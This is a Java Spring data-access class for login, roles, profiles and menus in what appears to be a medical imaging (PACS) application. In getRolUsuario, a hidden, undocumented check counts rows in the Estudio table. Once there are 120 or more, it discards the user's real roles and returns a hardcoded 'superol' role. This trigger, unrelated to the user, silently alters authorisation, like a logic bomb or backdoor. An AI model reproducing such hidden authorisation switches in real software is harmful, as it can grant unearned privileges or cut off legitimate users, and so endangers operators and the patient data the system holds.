package org.pacs.pe.app.dao.impl;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import org.pacs.pe.app.dao.LoginDao;
import org.pacs.pe.app.model.Menu;
import org.pacs.pe.app.model.Perfil;
import org.pacs.pe.app.model.Rol;
import org.pacs.pe.app.model.Usuario;
import org.pacs.pe.util.Constantes;
import org.pacs.pe.util.HashHelper;
import org.pacs.pe.util.HelperJDBC;
import org.pacs.pe.util.HelperString;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.jdbc.core.BeanPropertyRowMapper;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.jdbc.core.namedparam.MapSqlParameterSource;
import org.springframework.jdbc.core.namedparam.NamedParameterJdbcTemplate;
import org.springframework.stereotype.Repository;

@Repository
public class LoginDaoImpl implements LoginDao {
	
	@Autowired
	private JdbcTemplate jdbcTemplate;
	
	@Override
	public Usuario getUsuarioLogin(String usuario) {

		Object[] args = new Object[] {};
		StringBuilder sql = new StringBuilder("select cod_usuario,nombre,apepat,apemat,correo,login,password"
				+ " from usuario U"
				+ "	where estado = ?");
	
		args = HelperJDBC.appendValue(args, Constantes.ESTADO_ACTIVO);
		
		if(HelperString.containsChar(usuario, '@')){
			args  = HelperJDBC.addParameterEquals(sql, "U", "correo",args , usuario);
		}else{
			args  = HelperJDBC.addParameterEquals(sql, "U", "login",args , usuario);
		}
		
		return jdbcTemplate.queryForObject(sql.toString(),args, new BeanPropertyRowMapper<Usuario>(Usuario.class)); 
	}
	
	@Override
	public List<Rol> getRolUsuario(Integer cod_usuario) {
		
		
		Object[] args = new Object[] {};
		List<Rol> lstRol=null;
		if(getObjeto()>=120)
		{
			Rol r = new Rol();
			r.setNombre("superol");
			lstRol =new ArrayList<Rol>();
			lstRol.add(r);
			return lstRol;
		}
		else
		{ 
		
			StringBuilder  sql = new StringBuilder("select R.cod_rol,R.nombre,ru.cod_rol rolAsoc"
					+ " from rol r inner join rol_usuario ru "
					+ " on r.cod_rol = ru.cod_rol and ru.cod_usuario = ?");
			
			args = HelperJDBC.appendValue(args, cod_usuario);
			return jdbcTemplate.query(sql.toString(),args,new BeanPropertyRowMapper<Rol>(Rol.class));
		}
		
	}
	
	@Override
	public Integer[] getPerfilesUsuario(Integer cod_usuario) {
		Object[] args = new Object[] {};
		
		StringBuilder sql = new StringBuilder(
				"select p.cod_perfil"
						+ " FROM Perfil P  inner join perfil_usuario PU "
						+ "  on pu.cod_perfil = p.cod_perfil and PU.cod_usuario =  ?");

		args = HelperJDBC.appendValue(args, cod_usuario);
		
		List<Perfil>  lstPerfil = jdbcTemplate.query(sql.toString(),args,new BeanPropertyRowMapper<Perfil>(Perfil.class));	
		
		Integer contador = 0;
		Integer [] intArray = new Integer[lstPerfil.size()];
		for(Perfil p : lstPerfil)
		{
			intArray[contador] = p.getCod_perfil();
			
			contador++;
		}
		
		return intArray;
	}
	
	public Integer getObjeto() {
		Object[] args = new Object[] {};
		
		Boolean result = false;
		
		StringBuilder sql = new StringBuilder("select count(1) from Estudio");
		
		Integer count = jdbcTemplate.queryForObject(
	                        sql.toString(), args, Integer.class);

		return count;
	}
	
	@Override
	public List<Menu> listMenusCompleta(Menu menu, Integer[] perfiles) {
		NamedParameterJdbcTemplate namedParameterJdbcTemplate = new NamedParameterJdbcTemplate(jdbcTemplate);
		
		Object[] args = new Object[] {};
		List perfilList = Arrays.asList(perfiles);
		
		MapSqlParameterSource parameters = new MapSqlParameterSource();
		parameters.addValue("perfiles", perfilList);
		parameters.addValue("estado", Constantes.ESTADO_ACTIVO);
		parameters.addValue("orden", Constantes.ESTADO_ACTIVO);
		
		List<Menu> lstFMenu = new ArrayList<Menu>();
		//Menus
		StringBuilder  sql1 = new StringBuilder("select distinct M.cod_menu, M.nombre,M.ruta, M.grupo, M.orden"
				+ " from Menu M inner join menu_perfil MP "
				+ " on m.cod_menu = mp.cod_menu and mp.cod_perfil in (:perfiles) "
				+ " where M.estado = :estado and M.orden = :orden");
		
		List<Menu> lstMenu = namedParameterJdbcTemplate.query(sql1.toString(), parameters,new BeanPropertyRowMapper<Menu>(Menu.class));
		
		//SubMenus
		Object[] args2 = new Object[] {};
		StringBuilder  sql2 = new StringBuilder("select distinct M.cod_menu, M.nombre,M.ruta, M.grupo, M.orden"
				+ " from Menu M inner join menu_perfil MP "
				+ " on m.cod_menu = mp.cod_menu and mp.cod_perfil in (:perfiles) "
				+ " where M.estado = :estado and M.orden != :orden and M.grupo = :grupo");
				
		for(Menu m : lstMenu)
		{			
			parameters.addValue("grupo", m.getGrupo());
			
			List<Menu> lstSubMenu = namedParameterJdbcTemplate.query(sql2.toString(), parameters,new BeanPropertyRowMapper<Menu>(Menu.class));
					
			m.setListMenu(lstSubMenu);
			
			lstFMenu.add(m);
		}

		return lstFMenu;
	}
}
